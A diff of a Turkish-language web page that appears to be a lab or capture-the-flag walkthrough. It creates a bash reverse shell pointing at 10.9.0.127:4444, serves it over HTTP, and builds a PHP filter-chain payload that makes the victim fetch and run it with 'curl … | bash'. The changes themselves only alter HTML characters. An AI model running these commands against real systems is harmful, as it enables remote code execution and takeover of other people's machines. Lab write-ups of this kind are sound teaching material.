@@ -80,7 +80,7 @@ Kali makinemiz üzerinde “revshell” isimli bir shell oluşturuyoruz.
 <span class="highlight">nzy@kali$</span> echo 'bash -i >& /dev/tcp/10.9.0.127/4444 0>&1' > revshell
 </div>
 
-Kurban sistem üzerinden bu oluşturduğumuz shelle bağlanarak uzaktan kod çalıştırmayı gerçekleştireceğiz. O yüzden kendi IP adresimizi (VPN ile bağlandıysanız VPN IP adresinizi) / sembolünden sonra da dinleme yapmak istediğiniz portu seçiyorsunuz. Aynı klasör üstünde python server’ını başlatarak shell’i erişilebilir hale getirelim. <
+Kurban sistem üzerinden bu oluşturduğumuz shelle bağlanarak uzaktan kod çalıştırmayı gerçekleştireceğiz. O yüzden kendi IP adresimizi (VPN ile bağlandıysanız VPN IP adresinizi) / sembolünden sonra da dinleme yapmak istediğiniz portu seçiyorsunuz. Aynı klasör üstünde python server’ını başlatarak shell’i erişilebilir hale getirelim. 
 <div class="code-window">
 <br>
 <span class="highlight">nzy@kali$</span> sudo python3 -m http.server 80
@@ -91,7 +91,7 @@ Kurban sistem üzerinden bu oluşturduğumuz shelle bağlanarak uzaktan kod çal
 Shell’i oluşturup erişilebilir hale getirdikten sonra kurban sistem URL’sine, indirdiğimiz aracı kullanarak filter chain oluşturalım.
 <div class="code-window">
 <br>
-<span class="highlight">nzy@kali$</span> python3 php\_filter\_chain\_generator.py --chain '<?= \`curl -s -L 10.9.0.127/revshell|bash\` ?>'
+<span class="highlight">nzy@kali$</span> python3 php\_filter\_chain\_generator.py --chain '?= \`curl -s -L 10.9.0.127/revshell|bash\` ?'
 </div>
 
 Bunun çıktısındaki uzun satırları kopyalayalım 5. Adımda bu çıktıları kopyalayacağız.
